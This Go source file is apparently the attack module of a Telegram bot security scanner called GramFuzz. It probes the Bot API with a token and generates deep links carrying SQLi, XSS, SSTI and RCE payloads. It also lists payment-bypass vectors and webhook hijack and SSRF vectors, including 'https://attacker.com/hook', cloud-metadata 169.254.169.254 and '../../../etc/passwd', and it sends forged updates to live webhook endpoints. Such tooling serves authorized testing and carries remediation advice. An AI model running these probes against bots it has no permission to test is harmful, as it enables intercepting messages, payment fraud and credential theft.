package attack

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/kiurakku/GramFuzz/internal/assets"
	"github.com/kiurakku/GramFuzz/internal/findings"
	"github.com/kiurakku/GramFuzz/internal/recon"
)

const userAgent = "GramFuzz/0.3.0 (authorized-security-testing)"

// RunBotAPIAbuse checks for leaked tokens and probes Telegram Bot API.
func RunBotAPIAbuse(ctx context.Context, username string, profile *recon.Profile) []findings.Finding {
	var list []findings.Finding
	token := os.Getenv("BOT_TOKEN")

	if profile != nil {
		for _, s := range recon.ScanSecrets(profile.RawHTML) {
			if s.Type == "telegram_bot_token" {
				list = append(list, findings.New(
					"BOTAPI-LEAK", "critical", "bot-api-abuse", "secrets",
					"Bot token leaked in public profile",
					"Exposed token allows full bot impersonation, message interception, and user data access.",
					s.Value,
				).WithMeta("CWE-798", "Revoke token via @BotFather immediately; rotate and audit access logs.", ""))
			}
		}
	}

	if token == "" {
		list = append(list, findings.New(
			"BOTAPI-INFO", "info", "bot-api-abuse", "auth",
			"Bot API live testing skipped (no BOT_TOKEN)",
			"Set BOT_TOKEN env var to enable getMe, getWebhookInfo, getUpdates probing.",
			"api.telegram.org",
		))
		return list
	}

	apiBase := "https://api.telegram.org/bot" + token + "/"
	checks := []struct {
		method, title, cwe string
		sev                string
	}{
		{"getMe", "Bot identity exposed via API", "CWE-200", "info"},
		{"getWebhookInfo", "Webhook configuration leak", "CWE-200", "medium"},
		{"getUpdates", "Pending updates accessible (polling mode)", "CWE-200", "high"},
	}

	client := &http.Client{Timeout: 10 * time.Second}
	for _, c := range checks {
		select {
		case <-ctx.Done():
			return list
		default:
		}
		u := apiBase + c.method
		req, _ := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
		resp.Body.Close()

		if resp.StatusCode == 200 && strings.Contains(string(body), `"ok":true`) {
			sev := c.sev
			if c.method == "getUpdates" {
				var parsed struct {
					Result []json.RawMessage `json:"result"`
				}
				if json.Unmarshal(body, &parsed) == nil && len(parsed.Result) > 0 {
					sev = "critical"
				}
			}
			list = append(list, findings.New(
				"BOTAPI-"+strings.ToUpper(c.method), sev, "bot-api-abuse", "exposure",
				c.title,
				fmt.Sprintf("Bot API %s returned ok:true. Review exposed data.", c.method),
				truncate(string(body), 400),
			).WithMeta(c.cwe, "Use webhooks with secret_token; disable getUpdates in production; restrict token access.", u))
		}
	}

	return list
}

// RunInjectionVectors generates injection attack playbook for bot text handlers.
func RunInjectionVectors(username string) []findings.Finding {
	username = strings.TrimPrefix(username, "@")
	var list []findings.Finding
	payloads := parseLines(assets.InjectionWordlist)

	list = append(list, findings.New(
		"INJ-PLAYBOOK", "high", "injection-engine", "injection",
		"Multi-vector injection attack playbook",
		fmt.Sprintf("%d payloads for SQLi, XSS, SSTI, RCE, path traversal via bot messages and /start params.", len(payloads)),
		"Send each payload as message or embed in ?start= deep link",
	).WithMeta("CWE-74", "Sanitize all user input; use parameterized queries; encode HTML output.", ""))

	for i, p := range payloads {
		sev := classifyInjection(p)
		deepLink := fmt.Sprintf("https://t.me/%s?start=%s", username, url.QueryEscape(p))
		list = append(list, findings.New(
			fmt.Sprintf("INJ-%03d", i+1), sev, "injection-engine", "injection",
			"Injection payload vector",
			"Test as bot message text AND as /start deep link parameter.",
			deepLink,
		).WithMeta(injectionCWE(p), "Input validation + output encoding + WAF rules.", p))
	}

	return list
}

// RunPaymentLogic generates financial/business logic bypass vectors.
func RunPaymentLogic(username string) []findings.Finding {
	username = strings.TrimPrefix(username, "@")
	base := fmt.Sprintf("https://t.me/%s", username)

	vectors := []struct {
		id, title, payload, desc, cwe, sev string
	}{
		{"PAY-001", "Negative amount payment", "pay:-100", "Submit negative payment amount", "CWE-840", "high"},
		{"PAY-002", "Zero-cost purchase", "pay:0", "Bypass payment with zero amount", "CWE-840", "high"},
		{"PAY-003", "Currency confusion", "pay:100USD_as_RUB", "Currency mismatch exploitation", "CWE-840", "medium"},
		{"PAY-004", "Double spend race", "pay:rapid_double", "Send payment callback twice rapidly", "CWE-362", "high"},
		{"PAY-005", "Coupon stack abuse", "coupon:STACK100", "Apply multiple coupons", "CWE-840", "medium"},
		{"PAY-006", "VIP bypass", "vip:force_enable", "Force VIP status via start param", "CWE-863", "high"},
		{"PAY-007", "Referral self-loop", "ref:own_id", "Self-referral infinite rewards", "CWE-840", "medium"},
		{"PAY-008", "Stars/TON price manipulation", "stars:1_for_1000", "Manipulate Telegram Stars pricing", "CWE-840", "critical"},
		{"PAY-009", "Invoice replay", "invoice:replay_old", "Replay captured payment invoice", "CWE-294", "high"},
		{"PAY-010", "Webhook replay", "webhook:replay", "Replay payment webhook without idempotency", "CWE-294", "critical"},
	}

	var list []findings.Finding
	for _, v := range vectors {
		link := base + "?start=" + url.QueryEscape(v.payload)
		list = append(list, findings.New(
			v.id, v.sev, "logic-bypass", "logic",
			v.title, v.desc, link,
		).WithMeta(v.cwe, "Validate amounts server-side; idempotency keys; audit all financial operations.", link))
	}
	return list
}

// RunWebhookAttacks generates webhook hijack and SSRF vectors.
func RunWebhookAttacks(username string, backend string) []findings.Finding {
	var list []findings.Finding
	vectors := []struct {
		id, title, desc, poc, cwe, sev string
	}{
		{
			"WH-001", "Webhook URL takeover",
			"Register webhook to attacker-controlled server if bot token is compromised or setWebhook is unprotected.",
			"POST /setWebhook → https://attacker.com/hook", "CWE-306", "critical",
		},
		{
			"WH-002", "Missing secret_token validation",
			"Telegram supports X-Telegram-Bot-Api-Secret-Token header — verify backend checks it.",
			"POST /webhook without secret_token header", "CWE-306", "high",
		},
		{
			"WH-003", "SSRF via webhook URL",
			"If setWebhook accepts internal URLs (169.254.169.254, localhost), SSRF to cloud metadata.",
			"setWebhook → http://169.254.169.254/latest/meta-data/", "CWE-918", "critical",
		},
		{
			"WH-004", "Replay attack on webhook",
			"Resend captured Update JSON to webhook endpoint without timestamp/nonce validation.",
			"Replay captured POST /webhook body", "CWE-294", "high",
		},
	}

	for _, v := range vectors {
		list = append(list, findings.New(
			v.id, v.sev, "webhook-attack", "exposure",
			v.title, v.desc, v.poc,
		).WithMeta(v.cwe, "Validate secret_token; use HTTPS; reject internal IPs; implement idempotency.", v.poc))
	}

	if backend != "" {
		list = append(list, probeWebhookEndpoint(ctxBackground(), backend)...)
	}
	return list
}

func probeWebhookEndpoint(ctx context.Context, backend string) []findings.Finding {
	var list []findings.Finding
	paths := []string{"/webhook", "/api/webhook", "/telegram/webhook", "/bot/webhook"}
	client := &http.Client{Timeout: 5 * time.Second}

	for _, p := range paths {
		u := strings.TrimRight(backend, "/") + p
		req, _ := http.NewRequestWithContext(ctx, http.MethodPost, u, strings.NewReader(`{"update_id":1,"message":{"text":"/start"}}`))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", userAgent)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 512))
		resp.Body.Close()

		if resp.StatusCode == 200 {
			list = append(list, findings.New(
				"WH-LIVE", "critical", "webhook-attack", "exposure",
				"Live webhook accepts unauthenticated Update injection",
				fmt.Sprintf("POST %s returned HTTP 200 — attacker can inject fake Telegram updates.", p),
				truncate(string(body), 200),
			).WithMeta("CWE-306", "Validate X-Telegram-Bot-Api-Secret-Token; verify update structure; rate limit.", u))
		}
	}
	return list
}

// RunTelegramSurface maps Telegram-specific attack surface.
func RunTelegramSurface(username string) []findings.Finding {
	u := strings.TrimPrefix(username, "@")
	base := fmt.Sprintf("https://t.me/%s", u)

	links := []struct {
		id, title, path, desc, cwe, sev string
	}{
		{"TG-001", "Inline mode query injection", "?start=inline_query_PAYLOAD", "Inject via switch_inline_query", "CWE-20", "medium"},
		{"TG-002", "Login URL open redirect", "?start=login_REDIRECT", "login_url open redirect abuse", "CWE-601", "high"},
		{"TG-003", "Game callback abuse", "?start=game_score_99999", "Forge game high scores", "CWE-840", "medium"},
		{"TG-004", "Chat join request bypass", "?startgroup=force_join", "Force join group without approval", "CWE-863", "medium"},
		{"TG-005", "Bot mention injection", "/start@test@otherbot", "Cross-bot command injection", "CWE-74", "low"},
		{"TG-006", "Deep link parameter pollution", "?start=a&start=b", "HTTP parameter pollution in deep links", "CWE-235", "medium"},
		{"TG-007", "Menu button URL SSRF", "menu_button_url=internal", "Menu button pointing to internal URL", "CWE-918", "high"},
		{"TG-008", "Attachment path traversal", "send document ../../../etc/passwd", "File path traversal via bot file handler", "CWE-22", "high"},
	}

	var list []findings.Finding
	for _, l := range links {
		poc := base
		if strings.Contains(l.path, "?") {
			poc += l.path[strings.Index(l.path, "?"):]
		}
		list = append(list, findings.New(
			l.id, l.sev, "telegram-surface", "surface",
			l.title, l.desc, poc,
		).WithMeta(l.cwe, "Validate all Telegram platform features server-side.", poc))
	}
	return list
}

func parseLines(s string) []string {
	var out []string
	for _, line := range strings.Split(s, "\n") {
		line = strings.TrimSpace(line)
		if line != "" && !strings.HasPrefix(line, "#") {
			out = append(out, line)
		}
	}
	return out
}

func classifyInjection(p string) string {
	lower := strings.ToLower(p)
	switch {
	case strings.Contains(lower, "script"), strings.Contains(lower, "onerror"), strings.Contains(lower, "svg"):
		return "high"
	case strings.Contains(lower, "drop table"), strings.Contains(lower, "union"), strings.Contains(lower, "or '1'"):
		return "high"
	case strings.Contains(lower, "exec"), strings.Contains(lower, "system"), strings.Contains(lower, "popen"):
		return "critical"
	case strings.Contains(lower, "{{"), strings.Contains(lower, "${"):
		return "high"
	default:
		return "medium"
	}
}

func injectionCWE(p string) string {
	lower := strings.ToLower(p)
	switch {
	case strings.Contains(lower, "script"), strings.Contains(lower, "<"):
		return "CWE-79"
	case strings.Contains(lower, "union"), strings.Contains(lower, "drop"):
		return "CWE-89"
	case strings.Contains(lower, "{{"), strings.Contains(lower, "${"):
		return "CWE-1336"
	case strings.Contains(lower, "../"):
		return "CWE-22"
	default:
		return "CWE-74"
	}
}

func truncate(s string, n int) string {
	s = strings.ReplaceAll(s, "\n", " ")
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

func ctxBackground() context.Context {
	ctx, _ := context.WithTimeout(context.Background(), 30*time.Second)
	return ctx
}
